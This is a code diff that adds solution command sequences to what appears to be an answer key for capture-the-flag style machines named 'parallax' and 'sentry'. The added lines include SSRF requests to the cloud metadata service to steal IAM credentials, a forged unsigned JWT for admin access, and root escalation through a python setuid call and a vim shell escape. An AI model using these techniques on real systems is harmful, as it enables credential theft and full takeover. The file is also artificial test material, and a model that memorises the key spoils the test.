@@ -131,6 +131,23 @@ const SOLUTIONS = {
     "cloudctl cp reverse.sh s3://tempest-deploy/", "cat user.txt", "sudo -l",
     "sudo nmap --interactive", "!sh", "cat /root/root.txt",
   ],
+  parallax: [
+    "nmap 10.10.11.170", "curl http://10.10.11.170/",
+    'curl "http://10.10.11.170/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
+    'curl "http://10.10.11.170/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/parallax-deploy-role"',
+    "cloudctl assume-role PXSTS-8f2c91ad4e",
+    "cloudctl get s3://parallax-secure-artifacts/deploy.env",
+    "ssh nrichard@10.10.11.170", { pw: true }, "cat user.txt", "sudo -l", "getcap -r / 2>/dev/null",
+    "/usr/bin/python3.11 -c \"import os; os.setuid(0); os.system('/bin/sh')\"",
+    "cat /root/root.txt",
+  ],
+  sentry: [
+    "nmap 10.10.11.185", "curl http://10.10.11.185/", "curl http://10.10.11.185/api/token?user=guest",
+    'curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ." http://10.10.11.185/api/admin',
+    "ssh ops_svc@10.10.11.185", { pw: true }, "cat user.txt", "sudo -l",
+    "sudo vim -c ':!/bin/sh'",
+    "cat /root/root.txt",
+  ],
   axiom: [
     "nmap 10.10.11.244", "curl http://10.10.11.244:8080/", "curl http://10.10.11.244:8080/logs/latest.txt",
     "ssh cibuild@10.10.11.244", { pw: true }, "cat user.txt", "sudo -l", "id", "docker ps",
